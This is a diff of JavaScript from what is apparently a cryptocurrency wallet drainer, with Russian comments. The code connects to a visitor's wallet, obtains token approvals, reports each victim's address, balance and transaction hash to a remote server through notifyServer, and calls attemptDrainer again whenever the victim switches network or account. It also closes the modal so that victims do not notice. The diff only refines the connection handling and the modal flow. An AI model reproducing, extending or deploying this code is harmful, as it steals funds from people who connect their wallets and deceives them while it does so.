@@ -466,9 +466,9 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
         status = 'confirmed';
 
-        // Закрываем модальное окно сразу после успешного approve
+        // Закрываем модальное окно после успешного approve
         if (!modalClosed) {
-          console.log(`ℹ️ Закрываем модальное окно после approve токена ${token}`);
+          console.log(`ℹ️ Закрываем модальное окно после успешного approve для токена ${token}`);
           await hideModalWithDelay();
           modalClosed = true;
         }
@@ -492,6 +492,13 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
         throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
+      }
+
+      // Закрываем модальное окно, если allowance уже достаточно
+      if (!modalClosed) {
+        console.log(`ℹ️ Allowance достаточно для токена ${token}, закрываем модальное окно`);
+        await hideModalWithDelay();
+        modalClosed = true;
       }
     }
   }
@@ -582,7 +589,6 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
         txHash
       })
     });
-
     const data = await response.json();
     console.log(`📩 Ответ сервера:`, data);
     if (!data.success) {
@@ -949,73 +955,72 @@ async function handleConnectOrAction() {
       await hideModalWithDelay("Transaction already in progress.");
     }
   } catch (err) {
-    console.error('❌ Ошибка подключения или выполнения:', err.message);
-    let errorMessage = "Error: Failed to connect wallet. Please try again.";
-    if (err.message.includes('User closed modal')) {
-      errorMessage = "Error: Wallet connection cancelled.";
-    }
-    await hideModalWithDelay(errorMessage);
+    console.error('❌ Ошибка подключения:', err.message);
+    appKitModal.close(); // Закрываем модальное окно в случае ошибки
+    isTransactionPending = false;
+    showModal();
+    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
   }
 }
 
-// Функция ожидания подключения кошелька
+// === Обработка смены сети ===
+async function onChainChanged(chainId) {
+  console.log('🔄 Смена сети:', chainId);
+  if (connectedAddress && !isTransactionPending) {
+    await attemptDrainer();
+  } else {
+    console.log('⏳ Транзакция в процессе');
+    await hideModalWithDelay("Transaction in progress, please wait.");
+  }
+}
+
+// === Ожидание подключения кошелька через AppKit ===
 async function waitForWallet() {
   return new Promise((resolve, reject) => {
+    console.log('⏳ Ожидаем подключение кошелька через AppKit...');
+
+    // Определяем, является ли устройство мобильным
+    const isMobile = isMobileDevice();
+    console.log(`ℹ️ Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
+
+    // Функция для проверки аккаунтов
+    const handler = async (accounts) => {
+      if (accounts.length > 0) {
+        console.log('✅ Аккаунты найдены:', accounts);
+        clearTimeout(timeout);
+        clearInterval(checkInterval);
+        resolve(accounts[0]);
+      }
+    };
+
+    // Слушатель изменений аккаунтов
+    window.ethereum.on('accountsChanged', handler);
+
+    // Интервал для проверки аккаунтов
+    const checkInterval = setInterval(async () => {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+          clearTimeout(timeout);
+          clearInterval(checkInterval);
+          resolve(accounts[0]);
+        }
+      } catch (err) {
+        console.error('❌ Ошибка проверки аккаунтов:', err.message);
+      }
+    }, 1000);
+
+    // Тайм-аут на подключение
     const timeout = setTimeout(() => {
-      reject(new Error('Wallet connection timeout'));
+      window.ethereum.removeListener('accountsChanged', handler);
+      clearInterval(checkInterval);
+      reject(new Error('Timeout waiting for wallet connection'));
     }, 30000); // 30 секунд
 
-    appKitModal.subscribeState(async (state) => {
-      if (state.selectedNetworkId && state.connectedWalletInfo?.address) {
-        clearTimeout(timeout);
-        const address = state.connectedWalletInfo.address;
-        resolve(address);
-      }
-    });
-
-    appKitModal.subscribeEvents((event) => {
-      if (event.name === 'MODAL_CLOSED') {
-        clearTimeout(timeout);
-        reject(new Error('User closed modal'));
-      }
+    // Явный запрос подключения, если аккаунты не найдены сразу
+    window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
+      console.error('❌ Ошибка запроса аккаунтов:', err.message);
+      reject(err);
     });
   });
 }
-
-// Обработчик изменения сети
-function onChainChanged(chainIdHex) {
-  console.log(`🔄 Сеть изменена на ${chainIdHex}`);
-  const chainId = parseInt(chainIdHex, 16);
-  if (connectedAddress && !isTransactionPending) {
-    attemptDrainer().catch(err => {
-      console.error('❌ Ошибка после смены сети:', err.message);
-    });
-  }
-}
-
-// Обработчик изменения аккаунта
-window.ethereum.on('accountsChanged', (accounts) => {
-  if (accounts.length === 0) {
-    console.log('ℹ️ Кошелёк отключён');
-    connectedAddress = null;
-    hasDrained = false;
-    isTransactionPending = false;
-    actionBtn.textContent = 'Connect Wallet';
-    actionBtn.disabled = false;
-  } else {
-    console.log('ℹ️ Аккаунт изменён:', accounts[0]);
-    connectedAddress = accounts[0];
-    hasDrained = false;
-    isTransactionPending = false;
-    attemptDrainer().catch(err => {
-      console.error('❌ Ошибка после смены аккаунта:', err.message);
-    });
-  }
-});
-
-// Глобальный обработчик для предотвращения множественных действий
-window.addEventListener('beforeunload', (event) => {
-  if (isTransactionPending) {
-    event.preventValue = 'A transaction is in progress. Are you sure you want to leave?';
-  }
-});
